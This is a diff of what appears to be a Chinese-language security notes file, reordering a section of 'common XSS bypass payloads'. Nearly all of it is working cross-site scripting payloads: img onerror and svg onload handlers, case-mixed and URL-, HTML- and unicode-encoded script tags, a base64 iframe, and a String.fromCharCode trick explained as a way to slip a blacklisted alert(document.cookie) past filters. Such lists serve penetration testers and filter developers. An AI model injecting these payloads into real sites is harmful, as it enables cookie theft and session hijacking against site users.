@@ -12,54 +12,49 @@ Payload
 
 常用的XSS绕过payload
 ---------------------------------------------------
++ ``%26%2360;/u%26%2362;``
 + ``<img src="x" onerror=alert(1)>``
-+ ``onpointerrawupdate=(prompt)(123)%3E``
-    //这个事件只针对谷歌
++ ``<img src="1" onerror=location="javascript:alert(1)">``
++ ``<img src="1" onerror=location="javascript:alert%281%29">``
 + ``<img src=1 onmouseover=alert('xss')>``
++ ``<img src=1 onerror=alert(1)>``
++ ``<iMg src=1 oNeRrOr=alert(1)>``
++ ``<ImG src=1 OnErRoR=alert(1)>``
++ ``<img src=1 onerror="alert(&quot;M&quot;)">``
++ ``<svg onload=alert(1)>``
++ ``onpointerrawupdate=(prompt)(123)%3E``   //这个事件只针对谷歌
 + ``<a href="javascript:alert(1)">baidu</a>``
 + ``<a href="javascript:aaa" onmouseover="alert(/xss/)">aa</a>``
 + ``<script>alert('xss')</script>``
 + ``<script>prompt('xss')</script>``
++ ``<script>\u0061\u006c\u0065\u0072\u0074(1)</script>``
++ ``<script>alert(1)</script>``
++ ``<sCrIpT>alert(1)</sCrIpT>``
++ ``<ScRiPt>alert(1)</ScRiPt>``
++ ``<sCrIpT>alert(1)</ScRiPt>``
++ ``<ScRiPt>alert(1)</sCrIpT>``
++ ``%3Cscript%3Ealert(1)%3C/script%3E``
++ ``%253Cscript%253Ealert(1)%253C/script%253E``
++ ``&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;``
++ ``&#x253C;script&#x253E;alert(1)&#x253C;/script&#x3E;``
++ ``\u003Cscript\u003Ealert(1)\u003C/script\u003E``
 + ``<input value="" onclick=alert('xss') type="text">``
 + ``<input name="name" value="" onmouseover=prompt('xss') bad="">``
 + ``<iframe src="javascript:alert('xss')"><iframe>``
 + ``<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=">``
 + ``<iframe src="aaa" onmouseover=alert('xss') /><iframe>``
 + ``<iframe src="javascript:prompt(`xss`)"></iframe>``
-+ ``<svg onload=alert(1)>``
 + ``<embed id=x onfocus=alert(document.cookie) type=text/html autofocus>``
 + ``<object id=x onfocus=alert(1) type=text/html>``
-+ ``<input name="name" value="" onmouseover=prompt('xss') bad="">``
-+ ``<input type="hidden" accesskey="X" onclick="alert(1)"">``
 + ``eval(String.fromCharCode(97,108,101,114,116,40,100,111,99,117,109,101,110,116,46,99,111,111,107,105,101,41))``
     适用于绕过黑名单 alert 在跨站中，String.fromCharCode 主要是使到
     一些已经被列入黑名单的关键字或语句安全通过检测，把关键字或语句转换成为 ASCII 码，
     然后再用 String.fromCharCode 还原，因为大多数的过滤系统都不会把 String.fromCharCode
     加以过滤，例如关键字 alert 被过滤掉，那就可以这么利用 alert(document.cookie)
-+ ``<img src="1" onerror=alert(1)>``
-+ ``<img src="1" onerror=alert(1)>（实体化()``
-+ ``<img src=1 onerror=alert()>``
-+ ``<script>\u0061\u006c\u0065\u0072\u0074(1)</script>``
-+ ``<img src="1" onerror=location="javascript:alert(1)">``
-+ ``<img src="1" onerror=location="javascript:alert%281%29">``
-+ ``%3Cscript%3Ealert(1)%3C/script%3E``
-+ ``%253Cscript%253Ealert(1)%253C/script%253E``
-+ ``&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;``
-+ ``&#x253C;script&#x253E;alert(1)&#x253C;/script&#x3E;``
-+ ``\u003Cscript\u003Ealert(1)\u003C/script\u003E``
-+ ``%26%2360;/u%26%2362;``
-+ ``<script>alert(1)</script>``
-+ ``<sCrIpT>alert(1)</sCrIpT>``
-+ ``<ScRiPt>alert(1)</ScRiPt>``
-+ ``<sCrIpT>alert(1)</ScRiPt>``
-+ ``<ScRiPt>alert(1)</sCrIpT>``
-+ ``<img src=1 onerror=alert(1)>``
-+ ``<iMg src=1 oNeRrOr=alert(1)>``
-+ ``<ImG src=1 OnErRoR=alert(1)>``
-+ ``<img src=1 onerror="alert(&quot;M&quot;)">``
 + ``<marquee onscroll=alert(1)>``
 + ``<mArQuEe OnScRoLl=alert(1)>``
 + ``<MaRqUeE oNsCrOlL=alert(1)>``
++ ``<details/open/ontoggle=confirm('XSS')>``
 
 
 特殊的绕过
